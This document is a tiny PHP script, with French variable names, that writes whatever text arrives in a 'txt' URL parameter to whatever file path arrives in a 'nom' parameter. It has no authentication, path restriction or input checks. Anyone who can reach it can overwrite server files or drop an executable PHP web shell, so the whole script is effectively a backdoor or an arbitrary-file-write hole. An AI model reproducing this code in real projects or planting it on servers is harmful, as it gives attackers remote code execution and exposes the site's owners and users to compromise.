<?php
$fichier = $_GET["nom"];
$contenu = $_GET["txt"];
$myfile = fopen($fichier, "w") or die("Unable to open file!");

fwrite($myfile, $contenu);

fclose($myfile);
?>